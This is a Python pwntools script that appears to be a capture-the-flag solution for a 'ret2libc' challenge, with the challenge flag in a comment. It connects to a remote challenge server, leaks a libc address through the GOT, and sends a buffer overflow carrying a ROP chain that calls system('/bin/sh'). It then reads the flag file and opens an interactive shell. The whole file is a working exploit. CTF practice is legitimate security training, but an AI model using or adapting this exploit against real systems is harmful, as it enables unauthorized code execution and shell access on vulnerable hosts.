#!/usr/bin/env python
from pwn import *

# AD{We1c0me_h4cker!_:P}

context.arch = 'amd64'

e = ELF('./ret2libc')
l = ELF('./libc.so.6')

host , port = 'ctf.yuawn.idv.tw' , 10106
y = remote( host , port )

y.sendlineafter( ':' , str( e.got['__libc_start_main'] ) )

y.recvuntil('s 0x')
l.address += int( y.recvline()[:-2] , 16 ) - l.symbols['__libc_start_main']
log.success( 'libc -> {}'.format( hex( l.address ) ) )

pop_rdi = 0x400853

p = flat(
    '\x00' * 0x28,
    pop_rdi,
    l.search( '/bin/sh\x00' ).next(),
    l.symbols['system']
)

y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()